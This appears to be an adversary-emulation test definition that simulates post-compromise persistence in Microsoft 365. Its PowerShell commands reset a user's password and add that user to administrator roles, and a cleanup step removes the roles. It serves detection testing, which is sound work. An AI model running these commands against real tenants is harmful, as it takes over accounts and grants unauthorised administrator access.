@@ -1,0 +1,123 @@
+{
+  "id": "14f3af20-61f1-45b8-ad31-4637815f3f44",
+  "name": "Simulate - Post BEC persistence via user password reset followed by user added to company administrator role",
+  "description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n",
+  "platforms": [
+    "azure-ad"
+  ],
+  "steps": [
+    {
+      "id": "c35bc0eb-52a6-452b-9476-259d949a0d86",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"#{target_password}\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq '#{target_user}'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"#{target_user}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8bdb7d92-4de9-4b77-aa60-b056884a45ad",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module MSOnline\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-MsolService -Credential $credential\nRemove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\nRemove-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a436f572-523a-47aa-8f68-8dfd5cd116af",
+      "name": "Check dependency 1/1",
+      "description": "MSOnline and AzureAD modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing the missing ones.\nWrite-Output \"The following PS modules aren't currently installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required PS modules are installed\"\n  exit 0\n }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f856def6-a569-497f-babe-8e0b42bf3f36",
+      "name": "Resolve dependency 1/1",
+      "description": "MSOnline and AzureAD modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name MSOnline -Scope CurrentUser -Force\nInstall-Module -Name AzureAD -Scope CurrentUser -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5bc6e1f4-f372-4ed8-bbf2-7a2053d9a70e",
+      "name": "Re-check dependency 1/1",
+      "description": "MSOnline and AzureAD modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing the missing ones.\nWrite-Output \"The following PS modules aren't currently installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required PS modules are installed\"\n  exit 0\n }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "c35bc0eb-52a6-452b-9476-259d949a0d86",
+      "p": "on-success",
+      "o": "8bdb7d92-4de9-4b77-aa60-b056884a45ad"
+    },
+    {
+      "s": "c35bc0eb-52a6-452b-9476-259d949a0d86",
+      "p": "on-failure",
+      "o": "8bdb7d92-4de9-4b77-aa60-b056884a45ad"
+    },
+    {
+      "s": "a436f572-523a-47aa-8f68-8dfd5cd116af",
+      "p": "on-success",
+      "o": "c35bc0eb-52a6-452b-9476-259d949a0d86"
+    },
+    {
+      "s": "a436f572-523a-47aa-8f68-8dfd5cd116af",
+      "p": "on-failure",
+      "o": "f856def6-a569-497f-babe-8e0b42bf3f36"
+    },
+    {
+      "s": "f856def6-a569-497f-babe-8e0b42bf3f36",
+      "p": "on-success",
+      "o": "5bc6e1f4-f372-4ed8-bbf2-7a2053d9a70e"
+    },
+    {
+      "s": "5bc6e1f4-f372-4ed8-bbf2-7a2053d9a70e",
+      "p": "on-failure",
+      "o": "c35bc0eb-52a6-452b-9476-259d949a0d86"
+    }
+  ],
+  "tags": [
+    "T1098.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "target_password",
+      "type": "string",
+      "description": "The password that the user target_user will be reset to.",
+      "value": "Ohn05GeMe#$"
+    },
+    {
+      "name": "auth_username",
+      "type": "string",
+      "description": "Azure AD username used to conduct the adversary activity",
+      "value": "jonh@contoso.com"
+    },
+    {
+      "name": "auth_password",
+      "type": "string",
+      "description": "Azure AD password for user auth_username",
+      "value": "p4sswd"
+    },
+    {
+      "name": "target_user",
+      "type": "string",
+      "description": "Name of the user whose password be reset and added to the admin role.",
+      "value": "default"
+    }
+  ]
+}
